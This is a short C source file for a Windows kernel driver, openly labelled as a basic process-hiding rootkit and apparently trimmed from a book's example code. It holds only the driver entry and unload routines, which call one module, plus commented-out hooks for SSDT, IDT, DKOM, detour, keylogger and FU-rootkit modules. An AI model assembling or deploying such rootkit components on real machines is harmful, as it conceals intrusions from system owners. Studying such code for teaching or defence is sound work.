// BASIC ROOTKIT that hides processes
// ----------------------------------------------------------
// v0.1 - Initial, Greg Hoglund (hoglund@rootkit.com)
// v0.3 - Added defines to compile on W2K, and comments.  Rich
// v0.4 - Fixed bug while manipulating _SYSTEM_PROCESS array.
//		  Added code to hide process times of the _root_*'s. Creative
// v0.6 - Added way around system call table memory protection, Jamie Butler (butlerjr@acm.org)
// v1.0 - Trimmed code back to a process hider for the book.

//#include "hookssdt.h"
//#include "dkomeprocess.h"
//#include "idthook.h"
//#include "detour.h"
//#include "dt_template.h"
//#include "klog.h"
//#include "fu_rootkit.h"
#include "basic_hardware.h"

VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	Ktrace("(MYRKT)OnUnload called\n");
	
	//DE_OnUnload(DriverObject);
	//IH_OnUnload(DriverObject);
	//Hp_OnUnload(DriverObject);
	//DT_OnUnload(DriverObject);
	//DTT_OnUnload(DriverObject);
	//Klog_OnUnload(DriverObject);
	//FU_OnUnload(DriverObject);
	BH_OnUnload(DriverObject);
	return;
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, 
					 IN PUNICODE_STRING theRegistryPath)
{
	// Register a dispatch function for Unload
	Ktrace("(MYRKT)Register a dispatch function for Unload...\n");
	theDriverObject->DriverUnload  = OnUnload; 
	
	Ktrace("(MYRKT)Onload called\n");
	
	NTSTATUS status = STATUS_SUCCESS;
	//status = DE_Onload(theDriverObject, theRegistryPath);
	//status = IH_Onload(theDriverObject, theRegistryPath);
	//status = Hp_Onload(theDriverObject, theRegistryPath);
	//status = DT_Onload(theDriverObject, theRegistryPath);
	//status = DTT_Onload(theDriverObject, theRegistryPath);
	//status = Klog_Onload(theDriverObject, theRegistryPath);
	//status = FU_Onload(theDriverObject, theRegistryPath);
	status = BH_Onload(theDriverObject, theRegistryPath);

	return status;
}